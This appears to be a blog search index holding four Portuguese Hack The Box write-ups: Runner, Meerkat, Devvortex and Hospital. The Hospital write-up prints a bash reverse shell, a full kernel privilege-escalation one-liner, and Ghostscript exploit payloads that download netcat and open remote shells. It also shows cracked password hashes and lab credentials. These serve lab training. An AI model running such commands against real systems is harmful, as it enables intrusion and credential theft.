[
  
  {
    "title": "HTB Máquinas - Runner",
    "url": "/posts/HTB-Runner/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-23 07:30:12 -0300",
    





    
    "snippet": "RunnerEnumeraçãoNmap:──(yoshiro㉿kali)-[~/htb/runner]└─$ nmap 10.10.11.13 -A -sV -sCStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03Nmap scan report for runner.htb (10.10.11.13)Hos...",
    "content": "RunnerEnumeraçãoNmap:──(yoshiro㉿kali)-[~/htb/runner]└─$ nmap 10.10.11.13 -A -sV -sCStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03Nmap scan report for runner.htb (10.10.11.13)Host is up (0.34s latency).Not shown: 997 closed tcp ports (conn-refused)PORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp   open  http        nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Runner - CI/CD Specialists8000/tcp open  nagios-nsca Nagios NSCA|_http-title: Site doesn't have a title (text/plain; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 74.03 secondsJogando o IP no navegador, somos direcionados para um site que apresenta desenvolvedores especialiados em CI/CD. Esse site em sí, não oferece oportunidades para um ataque, então procurei por subdomínios. Utilizei uma wordlist própria em que contém palavras chaves relacionadas ao desenvolvimento CI/CD e, junto com o vhost, foi possível encontrar o dominio teamcity.runner.htb.Abaixo do login, é possível identificar a versão do TeamCity, sendo a  Version 2023.05.3 (build 129390). Pesquisando sobre, essa versão é vulneránel ao CVE-2023-42793.Explorando a vulnerabilidadeUtilizando o script, é possível gerar um login para acesso a plataforma.Após acessar, é possível identificar que a plataforma possuí backups, e nesses backups, é possível identificar uma chave de acesso.Também é possível identificar alguns usuários na plataforma do TeamCity, levando a considerar que a chave de acesso é referente ao usuário matthew ou John.User FlagConsegui acesso ao usuário John pelo SSh e consegui a flag user.Verificando mais afundo, é possível identificar que existe outro domínio sobre o sistema, o portainer-administration.runner.htb.Procurando por mais informações nos arquivos de backup, é possível encontrar informações sobre as senhas criptografadas dos usuários do sistema.Utilizando o hashcat, é possível descriptografar a senha do matthew.Root flagUtilizando as credenciais do matthew, é possível acessar a plataforma de dockers do runners.htb.Vamos criar um container para que seja possível realizar comandos via command bash. Primeiramente, criaremos um volume com as seguinte configurações:Depois, iremos criar um container com as seguintes configurações:Depois disso, iremos iniciar o container e iniciar um command bash e conseguir o acesso root."
  },
  
  {
    "title": "HTB Sherlocks - Meerkat",
    "url": "/posts/HTB-Meerkat/",
    "categories": "HTB, Sherlocks",
    "tags": "sherlocks, htb",
    "date": "2024-04-18 03:47:12 -0300",
    





    
    "snippet": "MeerkatTask 1Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?Antes de tudo, é possível observar que o hos...",
    "content": "MeerkatTask 1Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?Antes de tudo, é possível observar que o host local é o 172.31.6.44 e que, está recebendo muito tráfego vindo dos IP’s 54.144.148.213, 156.146.62.213, 138.199.59.221 e 95.181.232.30.Aplicando um filtro de tcp para a porta 8080 e para o host local e foi possível perceber que o aplicativo em execução é o BonitaSoft por conta das solicitações GET e POST que foram apresentadas.R: BonitaSoftTask 2Acreditamos que o invasor pode ter usado um subconjunto da categoria de ataque de força bruta – qual é o nome do ataque realizado?Análisando as solicitações POST que foram realizadas no host, é possível perceber que o atacante está utilizando um método de força bruta baseado em injeção de credenciais.R: Credential StuffingTask 3A vulnerabilidade explorada possui um CVE atribuído? Se sim, qual?Analisando o JSON é possível identificar que o atacante utilizou o CVE-2022-25237 para tentar conseguir acesso a aplicação com uma exploit provido do bonitasoft.R: CVE-2022-25237Task 4Qual string foi anexada ao caminho do URL da API para ignorar o filtro de autorização da exploração do invasor?Lendo sobre a vulnerabilidadae CVE-2022-25237, é possível identificar que ela funciona adicionando “i18ntranslation” em uma das duas variações da URL.R: i18ntranslationTask 5Quantas combinações de nomes de usuário e senhas foram usadas no ataque de preenchimento de credenciais?Apliquei o filtro http.request.method == “POST” e analisei quantas requisições únicas foram feitas.R: 56Task 6Qual combinação de nome de usuário e senha foi bem-sucedida?Análisando a última requisição do filtro aplicado anteriormente, foi possível identificar o usuário e senha.R: seb.broom@forela.co.uk:g0vernm3ntTask 7Se houver, qual site de compartilhamento de texto o invasor utilizou?Análisando o pacote 3652 com o método GET, foi possível identificar que o atacante utilizou o pastes.io.R: pastes.ioTask 8Forneça o nome do arquivo da chave pública usada pelo invasor para obter persistência em nosso host.Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo é hffgra4unv.R: hffgra4unvTask 9Você pode confirmar o arquivo modificado pelo invasor para ganhar persistência?Análisandoo script Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo modificado pelo atacante é /home/ubuntu/.ssh/authorized_keys.R: /home/ubuntu/.ssh/authorized_keysTask 10Você pode confirmar o ID da técnica MITRE deste tipo de mecanismo de persistência?Anaĺisando a Matrix do MITRE ATT&amp;CK, identifiquei um TTP que corresponde às ações do invasor: Chaves autorizadas SSH (T1098.004) em Manipulação de conta na coluna Persistência.R: T1098.004"
  },
  
  {
    "title": "HTB Máquinas - Devvortex",
    "url": "/posts/HTB-Devvortex/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-11 09:33:12 -0300",
    





    
    "snippet": "DevvortexEnumeraçãoPrimeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para realizar varreduras de portas e mapear dispositivos conectados a uma rede, o Nmap é uma poderosa u...",
    "content": "DevvortexEnumeraçãoPrimeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para realizar varreduras de portas e mapear dispositivos conectados a uma rede, o Nmap é uma poderosa utilidade de linha de comando que fornece informações detalhadas sobre hosts, serviços e sistemas operacionais em uma rede. Seus recursos incluem detecção de dispositivos, varredura de portas, identificação de serviços em execução, detecção de firewalls e análise de vulnerabilidades. Nessa situação, usei uma varredura simples para verificar quais portas estavam abertas.Após a varredura é possível encontrar as portas 80 e 22 abertas.A porta 80 é geralmente reservada para comunicações HTTP, que é o protocolo usado para transferência de informações na internet.A porta 22 está associada ao protocolo SSH, que é utilizado para acessar e gerenciar remotamente sistemas Unix-like. O SSH fornece uma conexão segura e criptografada, sendo amplamente utilizado para administração remota de servidores. Por meio de uma conexão SSH, os usuários podem executar comandos no terminal de um sistema remoto de forma segura, transferir arquivos e realizar outras operações.Usando o endereço ip 10.10.11.242 somos direcionados para http://devvortex.htb. Um site bem estruturado e que possuí um forms de contato sem nenhuma aplicação útil.Utilizei o gobuster nessa página, que é uma ferramenta utilizada para realizar ataques de força bruta em servidores web, buscando por recursos ocultos ou não autorizados. Seu principal propósito é ajudar na enumeração de diretórios e arquivos em um site, mas nesse caso, não foi encontrado nenhuma pista para qualquer avanço.Então decidi procurar por mais domínios atrelados ao devvortex.htb usando o dnsmap. Ao realizar consultas ao DNS, o DNSMap tenta encontrar subdomínios que podem representar possíveis pontos de entrada para ataques ou fornecer informações valiosas sobre a infraestrutura de um alvo.Encontrei outro domínio sendo o http://dev.devvortex.htb.Utilizando o gobuster nessa página foi possível encontrar uma página de administrador.Indo até http://dev.devvortex.htb/administrator/ foi possível encontrar página de login do “Joomla!”.O Joomla é usado como CMS, ele ajuda principalmente para gestão de conteúdo de páginas oferecendo ferramentas para criar, publicar e gerir conteúdos online. Vamos verificar qual versão está sendo rodada usando o JoomScan para procurar por vulnerabilidades.Descobrimos então, que a versão que o Devvortex está rodando é a 4.2.6.Explorando a vulnerabilidadePesquisando, encontrei a vulnerabilidade CVE-2023-23752, um exploit que explora versões abaixo da 4.2.8. Então, provavelmente, esse sistema será afetado por esse exploit.O exploit está disponível em:https://github.com/Acceis/exploit-CVE-2023-23752Mais informações em: https://nvd.nist.gov/vuln/detail/CVE-2023-23752Utilizando o exploit, conseguimos informações de login no sistema. E com essas informações, conseguimos adentrar no Joomla.Dentro do sistema, conseguimos o direito de edição dos templates. Seguindo o caminho System &gt; Templates &gt; Administrator Templates, encontrei algumas páginas php disponíveis dentro de um template.Implementei um código para que, assim que essa página fosse chamada pelo navegador, a linha seria lida e um shell reverso feito.O netcat é uma ferramenta utilizada para interação de rede, oferecendo funcionalidades versáteis de leitura e escrita de dados em sockets. O Netcat é muitas vezes referido como a “canivete suíço para TCP/IP” devido à sua flexibilidade e capacidade de desempenhar diversas funções e iremos utilizar dessa ferramenta para realizar um shell reverso.Assim que eu visitei http://dev.devvortex.htb/administrator/templates/atum/login.php, o meu netcat foi ativado, conseguindo assim acesso ao shell.Escalonando para usuárioVerificando o sistema de dentro, foi póssivel identificar o usuário logan novamente, pois antes haviamos encontrado ele no scan em que fizemos utilizando o JoomScan. E como ele está registrado no Joomla, é bem provável que a sua senha esteja no banco de dados do sistema.Antes de tentar acessar o banco de dados, é necessário iniciar um pseudo terminal de utilidades com python. É necessário pois precisamos iniciar uma interface para rodar os comandos do banco de dados.Pesquisando no banco de dados, é possível encontrar a tabela com os usuários do sistema, e abrindo ela, é possível identificar hashs de senhas. Vamos pegar a hash do usuário logan e quebrar utilizando o john the ripper para que possamos efetuar o login no ssh.Após essas etapas, é possível acessar o ssh com a senha que foi quebrada e conseguir a userflag.Escalonando para rootUtilizei “sudo -l” para listar os privilégios de sudo que o usuário logan possuí. Identifiquei quais operações estão autorizadas para ele, assim, proporcionando uma visão clara dos privilégios disponíveis e possíveis brechas para escalonar o privilegio como root. Com acesso a essas informações, consegui detectar a versão disponível no apport-cli.O Apport é um sistema de coleta e relatório de erros que ajuda os desenvolvedores e mantenedores do sistema a identificar e corrigir problemas em aplicativos e componentes do sistema. Isso é útil quando um usuário encontra um problema ou falha em um aplicativo e deseja fornecer informações detalhadas sobre o erro para ajudar no processo de correção. O relatório pode incluir informações sobre o sistema, logs relevantes e outros detalhes que podem ser úteis para diagnosticar e corrigir o problema.Essa versão do apport-cli possível uma vulnerabilidade em que vamos carregar e visualizar os crash reports usando o apport-cli. O sistema linux possuí esses crash no /var/crash, utilizando o seguinte comando:Após começar a carregar, digite V e a página de crash irá carregar. Dessa forma, poderemos digitar !sh conseguindo acesso root e a flag root."
  },
  
  {
    "title": "HTB Máquinas - Hospital",
    "url": "/posts/HTB-Hospital/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-11 08:47:12 -0300",
    





    
    "snippet": "HospitalEnumeraçãoComo sempre, iremos iniciar o pentesting usando o NMAP para verificar quais portas a aplicação usa. Irei verificar primeiramente com um comando simples.nmap 10.10.11.241 Starting ...",
    "content": "HospitalEnumeraçãoComo sempre, iremos iniciar o pentesting usando o NMAP para verificar quais portas a aplicação usa. Irei verificar primeiramente com um comando simples.nmap 10.10.11.241 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-14 18:02 -03Nmap scan report for 10.10.11.241Host is up (0.13s latency).Not shown: 980 filtered tcp ports (no-response)PORT     STATE SERVICE22/tcp   open  ssh53/tcp   open  domain88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap443/tcp  open  https445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl1801/tcp open  msmq2103/tcp open  zephyr-clt2105/tcp open  eklogin2107/tcp open  msmq-mgmt2179/tcp open  vmrdp3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPssl3389/tcp open  ms-wbt-server8080/tcp open  http-proxyMuitos serviços são hospedados nesse endereço. Vou começar pela porta 8080 e 443 já que essas portas estão hospedando os serviços https e http-proxy. Ao acessar o endereços 10.10.11.241:8080 e 10.10.11.241:443, somos direcionados a duas telas de login.Fazendo um usuário em 10.10.11.241:8080 é possível identificar uma página de upload de arquivos. Ou seja, possívelmente esse sistema seja vulnerável a algum arquivo infectado.Antes de mais nada, vamos verificar quais diretórios temos disponíveis nessa aplicação.gobuster dir -u http://10.10.11.241:8080 -w /home/kali/Documents/imp/wordlist/big.txt  ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.241:8080[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /home/kali/Documents/imp/wordlist/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.htaccess            (Status: 403) [Size: 279]/.htpasswd            (Status: 403) [Size: 279]/css                  (Status: 301) [Size: 317] [--&gt; http://10.10.11.241:8080/css/]/fonts                (Status: 301) [Size: 319] [--&gt; http://10.10.11.241:8080/fonts/]/images               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/images/]/js                   (Status: 301) [Size: 316] [--&gt; http://10.10.11.241:8080/js/]/l                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/l/]/m                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/m/]/server-status        (Status: 403) [Size: 279]/u                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/u/]/uploads              (Status: 301) [Size: 321] [--&gt; http://10.10.11.241:8080/uploads/]/vendor               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/vendor/]/w                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/w/]Progress: 20476 / 20477 (100.00%)===============================================================Finished===============================================================Com a existência do diretório /uploads, poderemos utiliza-lo como gatilho para o Powny Shell. Você pode verificar mais informações em https://github.com/flozz/p0wny-shell/blob/master/shell.php.Exploração da vulnerabilidadeEm primeiro caso, o sistema não estava aceitando enviar o Shell por ele estar em formato .php. Mas com uma simples alteração de formato para .phar, foi possível enviar o shell.Após enviar o shell, podemos acessar pelo seguinte link: 10.10.11.241:8080/uploads/shell.phar.Com o Shell feito, é possível iniciar o Shell reverso para um melhor desempenho.www-data@webserver:…/html/uploads# /usr/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.159/4444 0&gt;&amp;1'nc -lvpn 4444 listening on [any] 4444 ...10.10.11.241: inverse host lookup failed: Unknown hostconnect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6608bash: cannot set terminal process group (952): Inappropriate ioctl for devicebash: no job control in this shellwww-data@webserver:/var/www/html/uploads$ Identifiquei a versão do servidor, sendo ela a Ubuntu 23.04.www-data@webserver:/var/www/html/uploads$ cat /etc/os-releasecat /etc/os-releasePRETTY_NAME=\"Ubuntu 23.04\"NAME=\"Ubuntu\"VERSION_ID=\"23.04\"VERSION=\"23.04 (Lunar Lobster)\"VERSION_CODENAME=lunarID=ubuntuID_LIKE=debianHOME_URL=\"https://www.ubuntu.com/\"SUPPORT_URL=\"https://help.ubuntu.com/\"BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"UBUNTU_CODENAME=lunarLOGO=ubuntu-logoCom essas informação em mãos, encontrei as vulnerabilidades CVE-2023-2640 e CVE-2023-32629É possível verificar mais informações sobre em:https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629Para conseguirmos acesso como root, executaremos o seguinte comando:unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash\")'Agora iremos encontrar os usuários ativos do sistema usando cat /etc/passwd, e como resultados encontramos o usuário:drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bashUtilizando o comando cat /etc/shadow, é possível encontrar a hash de da senha do drwilliams.drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::Utilizando o hashcat, iremos quebrar a hash.hashcat hash.txt rockyou.txtO resultado foi:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#Com isso, será possível acessar o endereço 10.10.11.241:443 com o usuário do drwilliams.Esse sistema é referente a envios de e-mails. Caso o sistema não tenha sido desenvolvido corretamente, uma das formas de explorar vulnerabilidades nesses sistemas é utilizando GhostScript em arquivos .eps.Para explorar essa vulnerabilidade iremos utilizar um código injetável referente ao CVE-2023-36664.Primeiramente, iremos inicar um servidor http para que o nosso alvo faça o download do netcat.exe, da seguinte forma:python -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...Após isso, iremos realizar o nosso primeiro payload de um aquivo .eps solicitando para que o servidor baixe do nosso servidor o nc.exe.python3 CVE_2023_36664_exploit.py --inject --payload \"curl 10.10.14.159:8000/nc.exe -o nc.exe\" --filename file.epsApós isso, enviaremos esse arquivo file.eps como anexo a um e-mail ao Drbrown. (Favor, relevar o bug dos icones, isso não deveria ter acontecido :DD)Após isso, vamos configurar o nc.exe que enviamos anteriormente com o endereço e porta da nossa máquina e enviaremos novamente esse arquivo em anexo.python3 CVE_2023_36664_exploit.py --inject --payload \"nc.exe 10.10.14.159 4444 -e cmd.exe\" --filename file.epsApós isso, iremos realizar um novo arquivo inserindo o chamado ao nosso shell reverso.python3 CVE_2023_36664_exploit.py --inject --payload \"nc.exe 10.10.14.159 4444 -e nc.exe\" --filename file.epsAntes de enviar o próximo e-mail, inicie o seu netcat.nc -lvnp 4444listening on [any] 4444 ...Após enviar o e-mail, nosso shell reverso estará pronto.nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6124Microsoft Windows [Version 10.0.17763.4974](c) 2018 Microsoft Corporation. All rights reserved.C:\\Users\\drbrown.HOSPITAL\\Documents&gt;User FlagPara encontrar a user flag, basta navegar até o Desktop do drbrown.C:\\Users\\drbrown.HOSPITAL&gt;cd DesktopC:\\Users\\drbrown.HOSPITAL\\Desktop&gt;type user.txttype user.txt7f785f1abc*******fbc61fd9502c6c9cRoot FlagProcurando pelo ghostscript, foi possível descobrir a senha do Rpcclient.C:\\Users\\drbrown.HOSPITAL\\Documents&gt;type ghostscript.battype ghostscript.bat@echo offset filename=%~1powershell -command \"$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c \"C:\\Program` Files\\gs\\gs10.01.1\\bin\\gswin64c.exe\" -dNOSAFER \"C:\\Users\\drbrown.HOSPITAL\\Downloads\\%filename%\" }\"Após verificar Rpccliente, identifiquei que as informações de administrador é compartilhada com as de guest.rpcclient $&gt; querydispinfoindex: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH\tName: (null)\tDesc: (null)index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator\tName: Administrator\tDesc: Built-in account for administering the computer/domainindex: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown\tName: Chris Brown\tDesc: (null)index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams\tName: Lucy Williams\tDesc: (null)index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domainindex: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Accountindex: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a\tName: Microsoft Exchange Approval Assistant\tDesc: (null)index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a\tName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\tDesc: (null)index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8\tName: Microsoft Exchange\tDesc: (null)index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb\tName: E4E Encryption Store - Active\tDesc: (null)index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68\tName: Microsoft Exchange Federation Mailbox\tDesc: (null)index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309\tName: Microsoft Exchange\tDesc: (null)index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea\tName: Discovery Search Mailbox\tDesc: (null)index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db\tName: Microsoft Exchange\tDesc: (null)index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98\tName: Microsoft Exchange Migration\tDesc: (null)Nessa ocasião, podemos enviar o shell como convidado e acessar como administrador.No diretório C:\\xampp\\htdocs&gt;, envie o P0wny Shell.curl http://10.10.14.159:8080/shell.phar -o shell.phpApós isso, acesse https://10.10.11.241/shell.php e você poderá acessar como administrador e encontrar a flag root.Com isso, chegamos ao final de mais uma máquina! Lembre-se, todo o processo é bastate árduo e tentei ao máximo realizar de maneira didática! Até a próxima!"
  }
  
]

